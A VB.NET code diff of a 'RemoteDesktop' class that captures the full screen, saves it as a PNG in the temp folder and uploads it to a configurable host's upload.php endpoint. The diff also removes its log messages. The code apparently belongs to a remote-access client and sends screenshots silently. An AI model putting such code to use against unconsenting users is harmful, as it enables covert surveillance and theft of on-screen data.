@@ -3,15 +3,16 @@ Namespace Other
     Public Class RemoteDesktop
         Public Host As String
         Public ID As String
+        Dim TH As Threading.Thread
 
-        Public Sub Start()
+        Public Function Start()
             Try
-                TakeScreen(IO.Path.GetTempPath & "/" & ID & ".png")
-                Form1.C.Log("Succ", "Screenshot has been uploaded")
+                TakeScreen(IO.Path.GetTempPath & "\" & ID & ".png")
+                Return True
             Catch ex As Exception
-                Form1.C.Log("Fail", "An unexpected error occurred" & ex.Message)
+                Return False
             End Try
-        End Sub
+        End Function
         Private Function Upload(ByVal screenshot As String)
             Try
                 My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
@@ -20,7 +21,7 @@ Namespace Other
                 Return False
             End Try
         End Function
-        Public Sub TakeScreen(ByVal filename As String)
+        Public Function TakeScreen(ByVal filename As String)
             Try
                 Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
                 Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
@@ -30,12 +31,10 @@ Namespace Other
                 graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
                 graphics.Flush()
                 image.Save(filename, ImageFormat.Png)
-                If Upload(filename) = True Then
-                    IO.File.Delete(filename)
-                End If
+                Upload(filename)
             Catch ex As Exception
-
+                Return ex.Message
             End Try
-        End Sub
+        End Function
     End Class
 End Namespace
